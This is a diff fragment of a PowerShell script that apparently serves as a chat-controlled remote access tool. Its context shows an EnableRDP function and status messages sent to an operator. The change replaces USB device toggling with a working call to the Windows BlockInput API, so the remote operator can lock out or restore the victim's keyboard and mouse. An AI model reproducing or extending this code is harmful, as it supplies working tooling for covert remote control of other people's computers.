@@ -1057,18 +1057,16 @@ Function EnableRDP {
 }
 
 Function EnableIO{
-    $PNPMice = Get-WmiObject Win32_USBControllerDevice | %{[wmi]$_.dependent} | ?{$_.pnpclass -eq 'Mouse'}
-    $PNPMice.Enable()
-    $PNPKeyboard = Get-WmiObject Win32_USBControllerDevice | %{[wmi]$_.dependent} | ?{$_.pnpclass -eq 'Keyboard'}
-    $PNPKeyboard.Enable()
+    $signature = '[DllImport("user32.dll", SetLastError = true)][return: MarshalAs(UnmanagedType.Bool)]public static extern bool BlockInput(bool fBlockIt);'
+    Add-Type -MemberDefinition $signature -Name User32 -Namespace Win32Functions
+    [Win32Functions.User32]::BlockInput($false)
     sendMsg -Message ":white_check_mark: ``IO Enabled`` :white_check_mark:"
 }
 
 Function DisableIO{
-    $PNPMice = Get-WmiObject Win32_USBControllerDevice | %{[wmi]$_.dependent} | ?{$_.pnpclass -eq 'Mouse'}
-    $PNPMice.Disable()
-    $PNPKeyboard = Get-WmiObject Win32_USBControllerDevice | %{[wmi]$_.dependent} | ?{$_.pnpclass -eq 'Keyboard'}
-    $PNPKeyboard.Disable()
+    $signature = '[DllImport("user32.dll", SetLastError = true)][return: MarshalAs(UnmanagedType.Bool)]public static extern bool BlockInput(bool fBlockIt);'
+    Add-Type -MemberDefinition $signature -Name User32 -Namespace Win32Functions
+    [Win32Functions.User32]::BlockInput($true)
     sendMsg -Message ":octagonal_sign: ``IO Disabled`` :octagonal_sign:"
 }
 
